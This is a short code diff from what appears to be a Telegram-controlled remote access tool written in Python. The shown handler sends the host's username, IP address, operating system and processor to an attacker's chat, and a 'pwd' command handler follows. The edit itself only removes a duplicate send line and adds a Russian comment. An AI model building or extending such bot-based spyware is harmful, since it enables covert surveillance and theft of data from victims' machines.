@@ -120,9 +120,7 @@ def send_info(command) :
     processor = platform.processor() 
 
     bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
-        "\nProcessor: " + processor) 
-    bot.send_message(chat_id, "PC: " + username + "\nIP: " + IP + "\nOS: " + windows +
-    "\nProcessor: " + processor) 
+    "\nProcessor: " + processor) # Отправляем сообщение с данными
     
 @bot.message_handler(commands=['pwd', 'Pwd']) 
 def pwd(command) :
